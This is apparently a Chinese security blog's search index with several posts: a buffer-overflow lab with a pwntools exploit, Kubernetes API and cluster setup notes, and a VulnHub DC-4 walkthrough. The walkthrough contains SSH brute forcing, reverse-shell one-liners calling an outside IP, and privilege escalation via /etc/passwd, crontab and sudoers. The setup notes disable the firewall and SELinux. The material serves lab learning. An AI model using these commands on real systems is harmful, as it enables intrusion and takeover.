<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>给小祖的一句话</title>
    <link href="/2022/05/08/wsm/wsm/"/>
    <url>/2022/05/08/wsm/wsm/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="26f059cf187a35fd16f055cf4ccc962e55fb4edb1ebec4b4937cf8fe5a2a765b">243a5a51c8f989f24dae80ae7ef782d53d2023e001d7667560a53e4015084c783f7c946ceef9f681c264266ae625cc72e1a1507a634ade2e437a0741480ea547eaa85650781a3e62cc14ef6b76b01a7fc0112da29ac4eb80193b2f9f8b91a69e99ad8f1fb317c25b23ce18167473973b</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>pwn学习之Buffer Overflow</title>
    <link href="/2022/01/21/pwnlean/lab1/"/>
    <url>/2022/01/21/pwnlean/lab1/</url>
    
    <content type="html"><![CDATA[<p>本文学习一下pwn的Buffer Overflow</p><span id="more"></span><h2 id="1-前置知识"><a href="#1-前置知识" class="headerlink" title="1. 前置知识"></a>1. 前置知识</h2><p>StackFrame分为三部分，函数的前置，函数执行结束后的操作，函数操作部分。</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gyr74858kmj30ib097aab.jpg" alt="image-20220126172024146"></p><h3 id="1-1-Function-Prologue"><a href="#1-1-Function-Prologue" class="headerlink" title="1.1 Function Prologue"></a>1.1 Function Prologue</h3><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gyr77kgusdj30mn0gk75g.jpg" alt="image-20220126172140422"></p><p>前置的操作是保存断点，rbp是基地址</p><ol><li> push rbp    把main的地址保存stack , 此时 rsp指向原rbp的地址</li><li> mov rbp,rsp  把rbp移动到rsp</li><li></li></ol><h3 id="bof-c源码"><a href="#bof-c源码" class="headerlink" title="bof.c源码"></a>bof.c源码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">y0u_c4n7_533_m3</span><span class="hljs-params">()</span><br>&#123;<br>  execve(<span class="hljs-string">&quot;/bin/sh&quot;</span>, (<span class="hljs-type">char</span> *[])&#123;<span class="hljs-number">0</span>&#125;, (<span class="hljs-type">char</span> *[])&#123;<span class="hljs-number">0</span>&#125;);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">16</span>];<span class="hljs-comment">//0x10的buf</span><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;This is your first bof challenge ;)&quot;</span>);<br>  fflush(<span class="hljs-built_in">stdout</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x30</span>);<span class="hljs-comment">//此处为漏洞点</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>objdump查看函数，得到youcanseeme的地址<strong>0x400607</strong></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">objdump -d -M intel bof<br></code></pre></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gyr6v6unxfj30s709j407.jpg" alt="image-20220126171119424"></p><p>需要覆盖的地址为 <code>0x10(16buf)+0x08(1rbp)+0x08(1retaddress)</code></p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gyr6xzccyaj307z0a7q35.jpg" alt="image-20220126171424029"></p><h3 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>r = process(<span class="hljs-string">&quot;./bof&quot;</span>)<span class="hljs-comment">#加载进程</span><br><br>raw_input() <span class="hljs-comment"># 用于gdb调试exp的时候不需要这句</span><br><br>magic = <span class="hljs-number">0x400607</span> <span class="hljs-comment"># youcanseeme的地址</span><br><br>p = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span> + p64(magic) <span class="hljs-comment"># 1. 0x10的buf和rbp都写‘a’  2. ret-address 写youcanseeme函数的地址</span><br><br>r.recvuntil(<span class="hljs-string">&#x27;challenge ;)\n&#x27;</span>) <span class="hljs-comment"># 在接收到challenge的字符之后</span><br><br>r.send(p) <span class="hljs-comment"># 进行恶意输入覆盖</span><br><br>r.interactive() <span class="hljs-comment"># 接收</span><br></code></pre></td></tr></table></figure><h3 id="bof2"><a href="#bof2" class="headerlink" title="bof2"></a>bof2</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sh">from pwn import *<br>r = process(<span class="hljs-string">&quot;./bof2&quot;</span>)<br><span class="hljs-comment">#raw_input()</span><br>magic = 0x4006ac <span class="hljs-comment"># 传参的三个参数</span><br>p = <span class="hljs-string">&#x27;\x00&#x27;</span> * 0x18 + p64(magic)<br>r.recvuntil(<span class="hljs-string">&#x27;challenge ;)\n&#x27;</span>)<br>r.send(p)<br>r.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>k8sapi学习（未完）</title>
    <link href="/2022/01/21/k8s/k8s%20api-learn/"/>
    <url>/2022/01/21/k8s/k8s%20api-learn/</url>
    
    <content type="html"><![CDATA[<h3 id="查询pod"><a href="#查询pod" class="headerlink" title="查询pod"></a>查询pod</h3><p>查询所有的pod</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//查询所有的pod</span><br><span class="hljs-type">V1PodList</span> <span class="hljs-variable">list</span> <span class="hljs-operator">=</span> api.listPodForAllNamespaces(<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>,<br>                <span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>);<br><span class="hljs-comment">//输出</span><br><span class="hljs-keyword">for</span> (V1Pod item : list.getItems()) &#123;<br>            System.out.println(item);<br>        &#125;<br></code></pre></td></tr></table></figure><p>查询特定namespace下的pod</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//查询特定ns的pod</span><br><span class="hljs-type">V1PodList</span> <span class="hljs-variable">list2</span> <span class="hljs-operator">=</span> api.listNamespacedPod(<span class="hljs-string">&quot;ctf&quot;</span>,<span class="hljs-string">&quot;true&quot;</span>,<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>,<br>                <span class="hljs-literal">null</span>);<br><span class="hljs-comment">//输出</span><br><span class="hljs-keyword">for</span> (V1Pod item : list2.getItems()) &#123;<br>            System.out.println(item);<br>        &#125;<br></code></pre></td></tr></table></figure><h3 id="创建一个pod"><a href="#创建一个pod" class="headerlink" title="创建一个pod"></a>创建一个pod</h3><p>java操作部分</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//直接写config path</span><br><span class="hljs-type">String</span> <span class="hljs-variable">kubeConfigPath</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;config&quot;</span>;<br><br><span class="hljs-comment">//加载k8s, config</span><br><span class="hljs-type">ApiClient</span> <span class="hljs-variable">client</span> <span class="hljs-operator">=</span> ClientBuilder.kubeconfig(KubeConfig.loadKubeConfig(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileReader</span>(kubeConfigPath))).build();<br><br><span class="hljs-comment">//将加载config的client设置为默认的client</span><br>Configuration.setDefaultApiClient(client);<br><br><span class="hljs-comment">//创建一个api</span><br><span class="hljs-type">CoreV1Api</span> <span class="hljs-variable">api</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CoreV1Api</span>();<br><br><span class="hljs-comment">//指定分类</span><br>Yaml.addModelMap(<span class="hljs-string">&quot;v1&quot;</span>, <span class="hljs-string">&quot;Pod&quot;</span>, V1Pod.class);<br><br><span class="hljs-comment">//加载配置文件</span><br><span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> ResourceUtils.getFile(<span class="hljs-string">&quot;nginxpod.yaml&quot;</span>);<br><span class="hljs-comment">//根据文件创建 v1Pod</span><br><span class="hljs-type">V1Pod</span> <span class="hljs-variable">v1Pod</span> <span class="hljs-operator">=</span> (V1Pod) Yaml.load(file);<br><br><span class="hljs-comment">//5个参数 namespace V1Pod pretty </span><br>api.createNamespacedPod(<span class="hljs-string">&quot;ctf&quot;</span>,v1Pod,<span class="hljs-string">&quot;true&quot;</span>,<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>);<br></code></pre></td></tr></table></figure><p>nginxpod.yaml</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span> <span class="hljs-comment">##版本</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Pod</span>      <span class="hljs-comment">##类型</span><br><span class="hljs-attr">metadata:</span> <br>  <span class="hljs-attr">name:</span> <span class="hljs-string">nginx</span><br>  <span class="hljs-attr">namespace:</span> <span class="hljs-string">ctf</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">containers:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">image:</span> <span class="hljs-string">nginx:1.17.3</span><br>      <span class="hljs-attr">name:</span> <span class="hljs-string">pod</span><br>      <span class="hljs-attr">ports:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">nginx-port</span><br>          <span class="hljs-attr">containerPort:</span> <span class="hljs-number">80</span> <span class="hljs-comment">##容器的端口</span><br>          <span class="hljs-attr">hostPort:</span> <span class="hljs-number">8899</span>  <span class="hljs-comment">##映射到宿主机的端口</span><br>          <span class="hljs-attr">protocol:</span> <span class="hljs-string">TCP</span><br></code></pre></td></tr></table></figure><p>结果示例</p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gykqgxskc7j30dp0cxmxy.jpg" alt="image-20220121031103567" style="zoom:80%;" />]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>k8s主从配置</title>
    <link href="/2022/01/07/k8s/k8s%E4%BB%8E%E6%9C%BA%E9%85%8D%E7%BD%AE%E8%AE%B0%E5%BD%95/"/>
    <url>/2022/01/07/k8s/k8s%E4%BB%8E%E6%9C%BA%E9%85%8D%E7%BD%AE%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<p>k8s从机配置过程的一些记录</p><ol><li><p>修改ip地址dhcp时直接改ip是不可以的，需要改硬件地址</p><p> 办法如下：使用ip addr获得硬件地址，更改**/etc/sysconfig/network-scripts/ifcfg-ens**中的HWADDR的地址即可</p> <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">vim /etc/sysconfig/network-scripts/ifcfg-ensxxxxxx<br></code></pre></td></tr></table></figure><p> 然后调用重启network</p> <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">service network restart<br></code></pre></td></tr></table></figure><p> <img src="/Users/H3/TyporaPic/image-20220106202319013.png" alt="image-20220106202319013"></p></li><li><p>修改hostname</p> <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">hostnamectl set-hostname slave-2<br>hostnamectl --static set-hostname slave-2<br>hostnamectl --pretty set-hostname slave-2<br></code></pre></td></tr></table></figure></li><li><p>时间同步</p> <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">systemctl start chronyd<br>systemctl <span class="hljs-built_in">enable</span> chronyd<br><br></code></pre></td></tr></table></figure></li><li><p>禁用防火墙</p><p> 防止产生大量的规则混淆，所以直接关闭</p> <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">systemctl stop firewalld<br>systemctl <span class="hljs-built_in">disable</span> firewalld<br>systemctl stop iptables<br>systemctl <span class="hljs-built_in">disable</span> iptables<br></code></pre></td></tr></table></figure></li><li><p>禁用selinux</p><p> 这是个安全服务关了它防止出现各种问题</p> <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">vim /etc/selinux<span class="hljs-built_in">/config</span><br><span class="hljs-built_in"></span><span class="hljs-attribute">SELINUX</span>=disabled<br></code></pre></td></tr></table></figure></li><li><p>关闭swap</p> <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">vim <span class="hljs-regexp">/etc/</span>fstab<br><span class="hljs-comment">#注释最后一行</span><br></code></pre></td></tr></table></figure> <figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs coq">sudo sed -e &#x27;s|<span class="hljs-type">^mirrorlist</span>=|<span class="hljs-type">#mirrorlist</span>=|<span class="hljs-type">g</span>&#x27; \<br>         -e &#x27;s|<span class="hljs-type">^#baseurl</span>=http://mirrors.aliyun.com|<span class="hljs-type">baseurl</span>=https://mirrors.bfsu.edu.cn|<span class="hljs-type">g</span>&#x27; \<br>         -i.bak \<br>         /etc/yum.repos.d/CentOS-*.repo<br></code></pre></td></tr></table></figure></li><li><p>把节点加入进来</p> <figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm">kubeadm join <span class="hljs-number">192.168</span>.<span class="hljs-number">3.100</span>:<span class="hljs-number">6443</span> --token cgpppm.h<span class="hljs-number">6</span>q<span class="hljs-number">84</span>pqsqvr<span class="hljs-number">4</span>tkuq \<br>    --discovery-token-ca-cert-hash sha<span class="hljs-number">256</span>:<span class="hljs-number">01</span><span class="hljs-keyword">c</span><span class="hljs-number">55</span>b<span class="hljs-number">5</span>ca<span class="hljs-number">41440</span>eb<span class="hljs-number">129</span>b<span class="hljs-number">63</span>cda<span class="hljs-number">915</span>f<span class="hljs-number">18</span>a<span class="hljs-number">836</span><span class="hljs-keyword">c</span><span class="hljs-number">2</span><span class="hljs-keyword">c</span><span class="hljs-number">7</span>d<span class="hljs-number">53</span>bfd<span class="hljs-number">07</span><span class="hljs-keyword">c</span><span class="hljs-number">0228e7</span>b<span class="hljs-number">0</span>f<span class="hljs-number">51</span>b<span class="hljs-number">60</span>d<span class="hljs-number">3</span><br></code></pre></td></tr></table></figure></li><li> <figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs stylus">cat &lt;&lt;EOF &gt; /etc/docker/daemon<span class="hljs-selector-class">.json</span><br>&#123;<br><span class="hljs-string">&quot;registry-mirrors&quot;</span>: <span class="hljs-selector-attr">[<span class="hljs-string">&quot;https://mirror.ccs.tencentyun.com&quot;</span>]</span><br>&#125;<br>EOF<br><br>cat &lt;&lt;EOF &gt; /etc/docker/daemon<span class="hljs-selector-class">.json</span><br>&#123;<br>       <span class="hljs-string">&quot;exec-opts&quot;</span>: <span class="hljs-selector-attr">[<span class="hljs-string">&quot;native.cgroupdriver=systemd&quot;</span>]</span>,<br>       <span class="hljs-string">&quot;registry-mirrors&quot;</span>: <span class="hljs-selector-attr">[<span class="hljs-string">&quot;https://mirror.ccs.tencentyun.com&quot;</span>]</span><br>&#125;<br>EOF<br><br>kubeadm init \<br><span class="hljs-attr">--apiserver-advertise-address</span>=<span class="hljs-number">192.168</span>.<span class="hljs-number">3.100</span> \<br><span class="hljs-attr">--image-repository</span> registry<span class="hljs-selector-class">.aliyuncs</span>.com/google_containers \<br><span class="hljs-attr">--kubernetes-version</span>=v1.<span class="hljs-number">17.4</span> \<br><span class="hljs-attr">--service-cidr</span>=<span class="hljs-number">10.96</span>.<span class="hljs-number">0.0</span>/<span class="hljs-number">12</span> \<br><span class="hljs-attr">--pod-network-cidr</span>=<span class="hljs-number">10.244</span>.<span class="hljs-number">0.0</span>/<span class="hljs-number">16</span><br></code></pre></td></tr></table></figure></li></ol>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>DC系列靶机第四篇</title>
    <link href="/2022/01/05/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/DC-4/"/>
    <url>/2022/01/05/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/DC-4/</url>
    
    <content type="html"><![CDATA[<blockquote><p>  资源地址：<a href="https://download.vulnhub.com/dc/DC-4.zip">https://download.vulnhub.com/dc/DC-4.zip</a></p><p>  本机：192.168.3.15</p><p>  靶机：192.168.3.20</p></blockquote><h2 id="1-主机发现"><a href="#1-主机发现" class="headerlink" title="1. 主机发现"></a>1. 主机发现</h2><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy26rh8y6qj30yk08ajt2.jpg" alt="image-20220105020900106"></p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy2zvuk0v9j30as06l3yh.jpg" alt="image-20220105185636632"></p><h2 id="2-漏洞利用"><a href="#2-漏洞利用" class="headerlink" title="2. 漏洞利用"></a>2. 漏洞利用</h2><h3 id="2-1-web后台爆破"><a href="#2-1-web后台爆破" class="headerlink" title="2.1 web后台爆破"></a>2.1 web后台爆破</h3><p>对后台用户进行爆破，得到网站后台密码是happy</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy26y53g7bj316f0u0gpy.jpg" alt="image-20220105021500982"></p><h3 id="2-2-RCE"><a href="#2-2-RCE" class="headerlink" title="2.2 RCE"></a>2.2 RCE</h3><p>登陆进去后发现了如下功能</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy2zymaxzej305y057weg.jpg" alt="image-20220105185910157"></p><p>抓个包，发现是RCE</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy2zyu94lsj30ze0du41t.jpg" alt="image-20220105185833947"></p><h3 id="2-3-ssh爆破"><a href="#2-3-ssh爆破" class="headerlink" title="2.3 ssh爆破"></a>2.3 ssh爆破</h3><p>反弹shell之后发现/home的jim里又一个oldpwd.bak，使用海德拉进行ssh爆破</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">hydra -l jim -P dc-4pwd.txt -t 5 ssh://192.168.3.20<br><span class="hljs-comment">#结果为jibril04</span><br></code></pre></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy2nz4btgjj31140kin4f.jpg" alt="image-20220105120403732"></p><p>jim的mail里有charles的password<code>^xHhA&amp;hvim0y</code></p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy2o6p4vhaj31jh0u0n41.jpg" alt="image-20220105121149164"></p><h2 id="3-提权部分"><a href="#3-提权部分" class="headerlink" title="3. 提权部分"></a>3. 提权部分</h2><p>登入charles后，sudo -l发现了可以提权的teehee，teehee –help后发现-a选项可以追加内容，于是可以给/etc/passwd添加用户</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy2to6lq1uj31ao09e76f.jpg" alt="image-20220105152039547"></p><h3 id="关于-etc-passwd、crontab、sudoers的提权"><a href="#关于-etc-passwd、crontab、sudoers的提权" class="headerlink" title="关于/etc/passwd、crontab、sudoers的提权"></a>关于/etc/passwd、crontab、sudoers的提权</h3><p>可以使用teehee的<strong>追加内容</strong>进行如下几种方式提权</p><ol><li><p>/etc/passwd里添加root用户</p><p> 0表示权限为root</p> <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;admin::0:0:::/bin/bash&quot;</span>|sudo teehee -a /etc/passwd<br></code></pre></td></tr></table></figure><p> <img src="https://tva1.sinaimg.cn/large/008i3skNly1gy2zvf08avj30na0h4aed.jpg" alt="image-20220105185608027"></p><p> <img src="https://tva1.sinaimg.cn/large/008i3skNly1gy303bo4kqj30o10c8q5c.jpg" alt="image-20220105185525836"></p></li><li><p>/etc/crontab中执行定时任务</p> <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;* * * * * root chmod 4777 /bin/sh&quot;</span> | sudo teehee -a /etc/crontab<br></code></pre></td></tr></table></figure><p> <img src="https://tva1.sinaimg.cn/large/008i3skNly1gy2ubf560ej31fo0qiahc.jpg" alt="image-20220105154356757"></p></li><li><p>/etc/sudoers把当前用户的权限给普通用户charles</p> <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;charles ALL=(ALL:ALL) ALL&quot;</span> | sudo teehee -a /etc/sudoers<br></code></pre></td></tr></table></figure><p> <img src="https://tva1.sinaimg.cn/large/008i3skNly1gy2ubjme0ij31fg0ncjyb.jpg" alt="image-20220105154328682"></p></li></ol><h2 id="4-小结"><a href="#4-小结" class="headerlink" title="4. 小结"></a>4. 小结</h2><h3 id="4-1反弹shell"><a href="#4-1反弹shell" class="headerlink" title="4.1反弹shell"></a>4.1反弹shell</h3><ol><li> 进入交互模式</li></ol><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">python -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/sh&quot;)&#x27;</span><br>python -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></code></pre></td></tr></table></figure><ol start="2"><li> 反弹shell</li></ol><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">/bin/bash -i &gt;&amp; /dev/tcp/101.42.94.126/2333 0&gt;&amp;1<br><span class="hljs-built_in">rm</span> /tmp/f;<span class="hljs-built_in">mkfifo</span> /tmp/f;<span class="hljs-built_in">cat</span> /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.3.15 2333 &gt;/tmp/f<br></code></pre></td></tr></table></figure><h3 id="4-2-etc下passwd、crontab、sudoers的提权"><a href="#4-2-etc下passwd、crontab、sudoers的提权" class="headerlink" title="4.2 /etc下passwd、crontab、sudoers的提权"></a>4.2 /etc下passwd、crontab、sudoers的提权</h3><p>teehee的<strong>追加内容</strong>进行如下几种方式提权</p><ol><li> /etc/passwd里添加root</li></ol><p>​    用户名:口令:用户标识号:组标识号:注释性描述:主目录:登录Shell</p><blockquote><p>  用户名：略</p><p>  口令：现Linux系统都使用了shadow技术，把加密后的口令字存/etc/shadow文件中，而/etc/passwd文件的口令字段中只存放一个特殊的字符，例如 x 或者 * </p><p>  用户标识号： 0为root，1~99为管理员，100开始为普通用户</p><p>  组标识号：对应etc/group</p><p>  注释性描述：个人情况</p><p>  主目录:登录Shell </p><p>  置一个root用户且无密码，</p></blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;admin::0:0:::/bin/bash&quot;</span>|sudo teehee -a /etc/passwd<br></code></pre></td></tr></table></figure><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy2zvf08avj30na0h4aed.jpg" alt="image-20220105185608027" style="zoom: 67%;" /><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy303bo4kqj30o10c8q5c.jpg" alt="image-20220105185525836" style="zoom:67%;" /><ul><li>  /etc/crontab中执行定时任务</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;* * * * * root chmod 4777 /bin/sh&quot;</span> | sudo teehee -a /etc/crontab<br></code></pre></td></tr></table></figure><p>777是可读可写可执行、4多出来的这一位表示Linux的文件特殊权限，他们分别是Set UID、Set GID、Sticky Bit三种</p><blockquote><p>   <strong>Set UID，SUID</strong></p><p>  权值：4    符号：x –&gt; s     特点：仅对可执行文件有效。</p><p>  功能：可执行文件执行时，拥有文件所有者的权限。</p><p>  案例：/usr/bin/passwd 权限为4755，普通用户可执行passwd命令时，对应的普通用户，随机秒变高富帅，获得了root权限，可以修改普通用户平常根本想都不敢想、无法修改的root拥有的/etc/shadow系统文件（如果/usr/bin/passwd 权限为755，则普通用户执行passwd的时候，会出现无权限修改root own的/etc/shadow文件的问题）</p><p>   Set GID，SGID</p><p>  权值：2    符号：x –&gt; s    特点：文件、目录都可施法。</p><p>  功能：可执行文件、目录执行时，相同用户组的 拥有文件所有者权限。</p><p>  案例：SGID多用在特定的多人团队的项目开发上，在系统中用得较少</p><p>  <strong>Sticky Bit，SBit</strong></p><p>  权值：1    符号：x –&gt; t    特点：仅对目录有效。</p><p>  功能：当目录SBit=1，权限变为rwx rwx rwt时，在此文件夹下删除、重命名、移动的操作只允许是对应创建者用户或root（如果SBit=0，则用户间创建的文件可以互相删除，互相伤害）</p><p>  案例：/tmp 权限为1777，该目录下不同用户间不可互删文件，只能删自己的（如果/test 权限为777，则test目录下不同用户间可互删文件）</p><p>  【Linux文件特殊权限“隐藏关卡”】</p><p>  当创建者也没有执行权限（x位为0，例如rw-rw-rw-）时，那么就会出现暗藏关卡——大写SST，即rwSrwSrwT，代表空权限。</p></blockquote><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy30dcivosj30iu03ijrg.jpg" 